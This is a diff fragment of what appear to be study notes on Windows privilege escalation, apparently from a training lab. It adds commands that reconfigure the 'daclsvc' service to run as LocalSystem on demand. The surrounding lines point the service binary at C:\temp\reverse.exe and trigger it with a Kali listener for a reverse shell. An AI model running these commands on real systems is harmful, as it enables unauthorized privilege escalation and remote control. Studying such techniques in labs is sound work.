@@ -247,6 +247,12 @@ sc query daclsvc
 sc config daclsvc binpath= "\"C:\temp\reverse.exe\""
 ```
 
+#### Change the start + object
+```
+sc config daclsvc obj= ".\LocalSystem" password= ""
+sc config daclsvc start= "demand"
+```
+
 #### Start a listener on Kali, and then start the service to trigger the exploit:
 ```
 net start daclsvc
